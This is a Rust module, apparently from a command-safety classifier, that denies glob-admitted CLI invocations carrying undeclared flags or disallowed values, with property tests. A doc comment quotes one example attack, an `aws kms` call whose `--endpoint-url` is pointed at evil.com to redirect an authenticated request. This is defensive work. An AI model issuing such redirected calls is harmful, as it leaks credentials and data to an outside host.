//! The flag check for an invocation a `first_arg` glob admitted, out of `registry/mod.rs`.

use super::types::TomlSub;
use crate::parse::Token;

fn inherit(toml: &mut TomlSub, standalone: &[String], valued: &[String]) {
    let declared = !toml.first_arg_standalone.is_empty() || !toml.first_arg_valued.is_empty() || !toml.first_arg_loopback_valued.is_empty();
    let tolerant = toml.tolerate_unknown_short.unwrap_or(false) || toml.tolerate_unknown_long.unwrap_or(false);
    let own = !toml.standalone.is_empty() || !toml.valued.is_empty() || !toml.optional_valued.is_empty();
    if !toml.first_arg.is_empty() && own && !declared && !tolerant {
        toml.first_arg_standalone = toml.standalone.iter().chain(&toml.optional_valued).chain(standalone).cloned().collect();
        toml.first_arg_valued = toml.valued.iter().chain(valued).cloned().collect();
    }
}

pub(crate) fn inherit_sub_flags(mut toml: TomlSub) -> TomlSub {
    inherit(&mut toml, &[], &[]);
    toml
}

#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord)]
pub(in crate::registry) enum FlagValues {
    Listed(Vec<String>),
    AsciiLetters,
}

pub(crate) fn flag_values(parent: &str, name: &str, toml: &TomlSub) -> Result<Vec<(String, FlagValues)>, String> {
    let declared = |flag: &str| toml.valued.iter().chain(&toml.first_arg_valued).any(|f| f == flag);
    let mut out: Vec<(String, FlagValues)> = Vec::new();
    for (flag, values) in &toml.flag_values {
        if !declared(flag) || values.is_empty() {
            return Err(format!(
                "command '{parent}' sub `{name}` lists `{flag}` in `flag_values` without it in `valued`, or with no values"
            ));
        }
        out.push((flag.clone(), FlagValues::Listed(values.clone())));
    }
    for flag in &toml.ascii_letter_flags {
        if !declared(flag) || toml.flag_values.contains_key(flag) {
            return Err(format!(
                "command '{parent}' sub `{name}` lists `{flag}` in `ascii_letter_flags` without it in `valued`, or also in `flag_values`"
            ));
        }
        out.push((flag.clone(), FlagValues::AsciiLetters));
    }
    out.sort();
    Ok(out)
}

fn matched_flag<'a, 'b>(tokens: &'a [Token], idx: usize, values: &'b [(String, FlagValues)]) -> Option<(&'b FlagValues, Option<&'a str>)> {
    let s = tokens[idx].as_str();
    for (flag, rule) in values {
        if s == flag {
            return Some((rule, tokens.get(idx + 1).map(Token::as_str)));
        }
        if let Some(v) = s.strip_prefix(flag).and_then(|r| r.strip_prefix('=')) {
            return Some((rule, Some(v)));
        }
    }
    if s.starts_with("--") || !s.starts_with('-') {
        return None;
    }
    for (offset, ch) in s[1..].char_indices().take_while(|(_, c)| *c != '=') {
        let short = format!("-{ch}");
        if let Some((_, rule)) = values.iter().find(|(f, _)| *f == short) {
            let rest = &s[1 + offset + ch.len_utf8()..];
            let value = if rest.is_empty() { tokens.get(idx + 1).map(Token::as_str) } else { Some(rest) };
            return Some((rule, value));
        }
    }
    None
}

fn allowed_value(v: &str, rule: &FlagValues) -> bool {
    match rule {
        FlagValues::Listed(choices) => choices.iter().any(|c| c.strip_suffix('*').map_or(v == c, |p| v.starts_with(p))),
        FlagValues::AsciiLetters => !v.is_empty() && v.bytes().all(|b| b.is_ascii_alphabetic()),
    }
}

pub(crate) fn value_outside(tokens: &[Token], values: &[(String, FlagValues)]) -> bool {
    for idx in 0..tokens.len() {
        if tokens[idx] == "--" {
            break;
        }
        if let Some((rule, value)) = matched_flag(tokens, idx, values)
            && !value.is_some_and(|v| allowed_value(v, rule))
        {
            return true;
        }
    }
    false
}

fn short_cluster_known(s: &str, standalone: &[String], valued: &[String]) -> bool {
    for c in s[1..].chars() {
        let flag = format!("-{c}");
        if valued.contains(&flag) {
            return true;
        }
        if !standalone.contains(&flag) {
            return false;
        }
    }
    true
}

pub(crate) fn gated(
    tokens: &[Token],
    sub: &super::types::SubSpec,
    dispatch: impl FnOnce() -> crate::verdict::Verdict,
) -> crate::verdict::Verdict {
    if value_outside(tokens.get(1..).unwrap_or_default(), &sub.flag_values) { crate::verdict::Verdict::Denied } else { dispatch() }
}

pub(crate) fn with_wrapper_flags(mut subs: Vec<TomlSub>, standalone: &[String], valued: &[String]) -> Vec<TomlSub> {
    for sub in &mut subs {
        sub.sub = with_wrapper_flags(std::mem::take(&mut sub.sub), standalone, valued);
        inherit(sub, standalone, valued);
    }
    subs
}

/// Whether an invocation admitted by a `first_arg` GLOB carries a flag the family never declared.
///
/// The glob path used to allow on the strength of the first positional alone and never look at the
/// remaining tokens, so `aws kms get-public-key --endpoint-url http://evil.com` classified as an
/// ordinary read while redirecting an authenticated call to an arbitrary host. The verb claim
/// (`get-*` means read) is sound and stays; the flags are what needed a list.
///
/// An UNDECLARED family (both lists empty) keeps the old permissive behavior — the 240-odd AWS
/// service groups cannot be researched at once, and denying them wholesale would break every AWS
/// read. `no_new_unresearched_first_arg_family` in `tests.rs` pins the un-migrated set so the pile
/// cannot grow.
///
/// Non-flag tokens pass: some glob families take positionals (`kubectl get pods`), and the sensitive
/// ones are already caught earlier by `credential_first_arg`.
pub(crate) fn glob_presents_unlisted_flag(
    tokens: &[Token],
    skip: usize,
    standalone: &[String],
    valued: &[String],
    loopback_valued: &[String],
) -> bool {
    if standalone.is_empty() && valued.is_empty() && loopback_valued.is_empty() {
        return false;
    }
    let known = |f: &str| standalone.iter().any(|a| a == f) || valued.iter().any(|a| a == f);
    for (idx, t) in tokens.iter().enumerate().skip(skip) {
        let s = t.as_str();
        if s == "--" {
            break;
        }
        if !s.starts_with('-') || s == "-" || crate::cst::opaque::probe_is_value(tokens, idx, valued) {
            continue;
        }
        let head = s.split_once('=').map_or(s, |(f, _)| f);
        // A loopback-gated flag is admitted only when its VALUE names this machine. `--endpoint-url
        // http://localhost:8000` is a developer talking to their own service; the same flag pointed
        // anywhere else redirects an authenticated request. A missing value denies — the flag is
        // meaningless without one and guessing would be the fail-open direction.
        if loopback_valued.iter().any(|a| a == head) {
            let value = match s.split_once('=') {
                Some((_, v)) => Some(v),
                None => tokens.get(idx + 1).map(Token::as_str),
            };
            if value.is_some_and(crate::netloc::is_loopback) {
                continue;
            }
            return true;
        }
        if known(head) {
            continue;
        }
        if !s.starts_with("--") && short_cluster_known(s, standalone, valued) {
            continue;
        }
        return true;
    }
    false
}

#[cfg(test)]
mod tests {
    use super::*;
    use proptest::prelude::*;

    fn tokens(words: &[String]) -> Vec<Token> {
        words.iter().cloned().map(Token::from_raw).collect()
    }

    fn strings(words: &[&str]) -> Vec<String> {
        words.iter().map(|w| w.to_string()).collect()
    }

    fn sub(extra: &str) -> TomlSub {
        toml::from_str(&format!("name = \"x\"\nfirst_arg = [\"get-*\"]\n{extra}")).expect("sub parses")
    }

    #[test]
    fn a_sub_with_flags_of_its_own_and_none_for_its_glob_inherits_the_wrapper_flags() {
        for own in ["standalone = [\"-a\"]", "valued = [\"-b\"]", "optional_valued = [\"-c\"]"] {
            let mut s = sub(own);
            inherit(&mut s, &strings(&["-w"]), &strings(&["-v"]));
            assert!(s.first_arg_standalone.contains(&"-w".to_string()), "{own}");
            assert!(s.first_arg_valued.contains(&"-v".to_string()), "{own}");
        }
    }

    #[test]
    fn a_sub_with_no_flags_of_its_own_inherits_nothing() {
        let mut s = sub("");
        inherit(&mut s, &strings(&["-w"]), &strings(&["-v"]));
        assert!(s.first_arg_standalone.is_empty() && s.first_arg_valued.is_empty());
    }

    #[test]
    fn a_glob_that_declares_any_flag_list_keeps_it() {
        for declared in ["first_arg_standalone = [\"-s\"]", "first_arg_valued = [\"-s\"]", "first_arg_loopback_valued = [\"-s\"]"] {
            let mut s = sub(&format!("standalone = [\"-a\"]\n{declared}"));
            inherit(&mut s, &strings(&["-w"]), &strings(&["-v"]));
            assert!(!s.first_arg_standalone.contains(&"-w".to_string()), "{declared}");
            assert!(!s.first_arg_valued.contains(&"-v".to_string()), "{declared}");
        }
    }

    #[test]
    fn a_sub_that_tolerates_unknown_flags_inherits_nothing() {
        for tolerant in ["tolerate_unknown_short = true", "tolerate_unknown_long = true"] {
            let mut s = sub(&format!("standalone = [\"-a\"]\n{tolerant}"));
            inherit(&mut s, &strings(&["-w"]), &strings(&["-v"]));
            assert!(s.first_arg_standalone.is_empty(), "{tolerant}");
        }
    }

    #[test]
    fn flag_values_need_the_flag_in_valued_and_at_least_one_value() {
        let with_values = |extra: &str| sub(&format!("{extra}\nflag_values = {{ \"--out\" = [\"json\"] }}"));
        assert!(flag_values("c", "x", &with_values("valued = [\"--out\"]")).is_ok());
        assert!(flag_values("c", "x", &with_values("first_arg_valued = [\"--out\"]")).is_ok());
        assert!(flag_values("c", "x", &with_values("valued = [\"--other\"]")).is_err());
        assert!(flag_values("c", "x", &sub("valued = [\"--out\"]\nflag_values = { \"--out\" = [] }")).is_err());
        let with_letters = |extra: &str| sub(&format!("{extra}\nascii_letter_flags = [\"--env\"]"));
        assert!(flag_values("c", "x", &with_letters("valued = [\"--env\"]")).is_ok());
        assert!(flag_values("c", "x", &with_letters("first_arg_valued = [\"--env\"]")).is_ok());
        assert!(flag_values("c", "x", &with_letters("valued = [\"--other\"]")).is_err());
        assert!(flag_values("c", "x", &with_letters("valued = [\"--env\"]\nflag_values = { \"--env\" = [\"dev\"] }")).is_err());
    }

    #[test]
    fn a_short_cluster_is_known_only_when_every_letter_is_declared_up_to_a_valued_one() {
        let (standalone, valued) = (strings(&["-a", "-b"]), strings(&["-v"]));
        assert!(short_cluster_known("-ab", &standalone, &valued));
        assert!(short_cluster_known("-av", &standalone, &valued));
        assert!(short_cluster_known("-avzzz", &standalone, &valued));
        assert!(!short_cluster_known("-abz", &standalone, &valued));
        assert!(!short_cluster_known("-zv", &standalone, &valued));
    }

    #[test]
    fn only_a_single_dash_cluster_of_declared_letters_is_read_as_flags() {
        let (standalone, valued) = (strings(&["--", "-a", "-b"]), Vec::new());
        let line = |words: &[&str]| tokens(&strings(words));
        assert!(!glob_presents_unlisted_flag(&line(&["get-x", "-ab"]), 1, &standalone, &valued, &[]));
        assert!(glob_presents_unlisted_flag(&line(&["get-x", "-abz"]), 1, &standalone, &valued, &[]));
        assert!(glob_presents_unlisted_flag(&line(&["get-x", "--ab"]), 1, &standalone, &valued, &[]));
    }

    proptest! {
        /// An undeclared family refuses nothing, whatever the line holds.
        #[test]
        fn an_undeclared_family_refuses_nothing(words in proptest::collection::vec("-{0,2}[a-z=]{0,6}", 0..6)) {
            prop_assert!(!glob_presents_unlisted_flag(&tokens(&words), 0, &[], &[], &[]));
        }

        /// Only a flag the family did not declare refuses: adding it to the list clears it, and
        /// anything after `--` is never a flag.
        #[test]
        fn only_an_undeclared_flag_refuses(flag in "--[a-z]{1,8}", declared in "--[a-z]{1,8}", rest in proptest::collection::vec("[a-z]{0,6}", 0..3)) {
            let mut line = vec!["get-x".to_string(), flag.clone()];
            line.extend(rest.iter().cloned());
            let listed = [declared.clone()];
            prop_assert_eq!(glob_presents_unlisted_flag(&tokens(&line), 1, &listed, &[], &[]), flag != declared);
            let both = [declared, flag.clone()];
            prop_assert!(!glob_presents_unlisted_flag(&tokens(&line), 1, &both, &[], &[]));
            let after = vec!["get-x".to_string(), "--".to_string(), flag];
            prop_assert!(!glob_presents_unlisted_flag(&tokens(&after), 1, &listed, &[], &[]));
        }

        /// A flag's value is judged the same in every spelling, and only a listed value passes.
        #[test]
        fn a_value_is_judged_alike_in_every_spelling(value in "(json|jsonpath=[a-z]{0,4}|[a-z][a-z=-]{0,8})", lead in "[a-z]{0,3}") {
            let rule = || FlagValues::Listed(vec!["json".to_string(), "jsonpath=*".to_string()]);
            let choices = vec![("--output".to_string(), rule()), ("-o".to_string(), rule())];
            let listed = value == "json" || value.starts_with("jsonpath=");
            let forms = [
                vec![lead.clone(), "-o".to_string(), value.clone()],
                vec![lead.clone(), format!("-o={value}")],
                vec![lead.clone(), format!("-o{value}")],
                vec![lead.clone(), "-Ao".to_string(), value.clone()],
                vec![lead.clone(), format!("-Ao{value}")],
                vec![lead.clone(), "--output".to_string(), value.clone()],
                vec![lead.clone(), format!("--output={value}")],
            ];
            for form in &forms {
                prop_assert_eq!(value_outside(&tokens(form), &choices), !listed, "{:?}", form);
            }
            prop_assert!(value_outside(&tokens(&[lead.clone(), "-o".to_string()]), &choices));
            prop_assert!(!value_outside(&tokens(&[lead, "--".to_string(), "-o".to_string(), value]), &choices));
        }

        /// An `ascii_letter_flags` value made only of ASCII letters passes in every spelling.
        #[test]
        fn ascii_letter_flag_admits_any_letter_word_in_every_spelling(word in "[A-Za-z]{1,16}", lead in "[a-z]{0,3}") {
            let choices = vec![
                ("--env".to_string(), FlagValues::AsciiLetters),
                ("-E".to_string(), FlagValues::AsciiLetters),
                ("-e".to_string(), FlagValues::AsciiLetters),
            ];
            for form in [
                vec![lead.clone(), "-E".to_string(), word.clone()],
                vec![lead.clone(), format!("-E={word}")],
                vec![lead.clone(), format!("-E{word}")],
                vec![lead.clone(), "-fE".to_string(), word.clone()],
                vec![lead.clone(), format!("-fE{word}")],
                vec![lead.clone(), "-e".to_string(), word.clone()],
                vec![lead.clone(), format!("-e={word}")],
                vec![lead.clone(), format!("-e{word}")],
                vec![lead.clone(), "-fe".to_string(), word.clone()],
                vec![lead.clone(), format!("-fe{word}")],
                vec![lead.clone(), "--env".to_string(), word.clone()],
                vec![lead, format!("--env={word}")],
            ] {
                prop_assert!(!value_outside(&tokens(&form), &choices), "{:?}", form);
            }
            for cmd in [
                format!("mise use -E {word} node@20"),
                format!("mise use -E{word} node@20"),
                format!("mise use --env={word} node@20"),
                format!("mise use --env {word} node@20"),
                format!("mise use -fE {word} node@20"),
                format!("mise u -e {word} node@20"),
                format!("mise u -e{word} node@20"),
                format!("mise set -E {word} FOO=bar"),
                format!("mise set -E{word} FOO=bar"),
                format!("mise set --env={word} FOO=bar"),
                format!("mise set --env {word} FOO=bar"),
            ] {
                prop_assert!(crate::is_safe_command(&cmd), "{}", cmd);
            }
        }

        /// An `ascii_letter_flags` value with any non-letter character, or empty, is refused in every spelling.
        #[test]
        fn ascii_letter_flag_refuses_any_non_letter_in_every_spelling(
            before in "[A-Za-z]{0,4}",
            bad in "[^A-Za-z\\s'\"`\\\\$]{1,3}",
            after in "[A-Za-z]{0,4}",
            lead in "[a-z]{0,3}",
        ) {
            let choices = vec![
                ("--env".to_string(), FlagValues::AsciiLetters),
                ("-E".to_string(), FlagValues::AsciiLetters),
                ("-e".to_string(), FlagValues::AsciiLetters),
            ];
            let value = format!("{before}{bad}{after}");
            for v in [value.as_str(), ""] {
                for form in [
                    vec![lead.clone(), "-E".to_string(), v.to_string()],
                    vec![lead.clone(), format!("-E={v}")],
                    vec![lead.clone(), "-fE".to_string(), v.to_string()],
                    vec![lead.clone(), "--env".to_string(), v.to_string()],
                    vec![lead.clone(), format!("--env={v}")],
                ] {
                    prop_assert!(value_outside(&tokens(&form), &choices), "{:?}", form);
                }
            }
            if !value.starts_with('=') {
                prop_assert!(value_outside(&tokens(&[lead.clone(), format!("-E{value}")]), &choices), "-E{value}");
                prop_assert!(!crate::is_safe_command(&format!("mise use -E'{value}' node@20")), "mise use -E'{value}' node@20");
            }
            prop_assert!(value_outside(&tokens(&[lead, format!("-fE{value}")]), &choices), "-fE{value}");
            for cmd in [
                format!("mise use -E '{value}' node@20"),
                format!("mise use -fE'{value}' node@20"),
                format!("mise use --env='{value}' node@20"),
                format!("mise use --env '{value}' node@20"),
                format!("mise use -fE '{value}' node@20"),
                format!("mise u -e '{value}' node@20"),
                format!("mise set -E '{value}' FOO=bar"),
                format!("mise set --env='{value}' FOO=bar"),
                "mise use --env='' node@20".to_string(),
                "mise set -E '' FOO=bar".to_string(),
            ] {
                prop_assert!(!crate::is_safe_command(&cmd), "{}", cmd);
            }
        }
    }
}
